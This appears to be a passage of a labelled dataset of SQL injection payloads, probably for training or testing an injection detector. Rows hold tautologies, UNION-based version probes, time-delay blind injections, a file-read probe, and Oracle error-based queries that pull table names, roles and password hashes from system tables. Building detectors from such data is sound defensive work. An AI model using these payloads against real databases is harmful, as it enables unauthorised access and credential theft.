row_index,payload_norm,label,sqli_type_hint
390,"select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'",1,
391,"select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1",1,
392,"admin""or 1 = 1 or """" = """,1,
393,uni on sel ect,1,
394,""" or """"&""",1,
395,) ) ;waitfor delay '0:0:__TIME__'--,1,
396,"select * from users where id = 1 or ""?;"" or 1 = 1 -- 1",1,
397,1 waitfor delay '0:0:10'--,1,
398,bfilename,1,
399,admin' ) or ( '1' = '1'--,1,
400,UEf,1,
401,1 or sleep ( __TIME__ ) #,1,
402,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",1,
403,"select * from users where id = '1' union select $[""],@@VERSION -- 1'",1,
404,"select * from users where id = '1' + @ ( 1 ) union select 1,version ( ) -- 1'",1,
405,1' and 1 = ( select count ( * ) from tablenames ) ; --,1,
406,or sleep ( __TIME__ ) #,1,
407,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 8 ) ) AND 'i' = 'i",1,
408,"select * from users where id = 1 or 1#"", = 1 or 1 = 1 -- 1",1,
409,||6,1,
410,or 1/*,1,
411,"and 1 = ( if ( ( load_file ( char ( 110,46,101,120,116 ) ) <>char ( 39,39 ) ) ,1,0 ) ) ;",1,
412,select * from users where id = 1.%@ or 1 = 1 -- 1,1,
413,"select * from users where id = 1 or "".."" = 1 or 1 = 1 -- 1",1,
414,"select * from users where id = 1 or 1&@# = 1 union select 1,version ( ) -- 1",1,
415,"select * from users where id = 1 or "";]"" or 1 = 1 -- 1",1,
416,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",1,
417,select * from users where id = 1 or $<\. or 1 = 1 -- 1,1,
418,"select * from users where id = 1 * ( 1 ) union select 1,banner from v$version where rownum = 1 -- 1",1,
419,or 'whatever' in ( 'whatever' ),1,
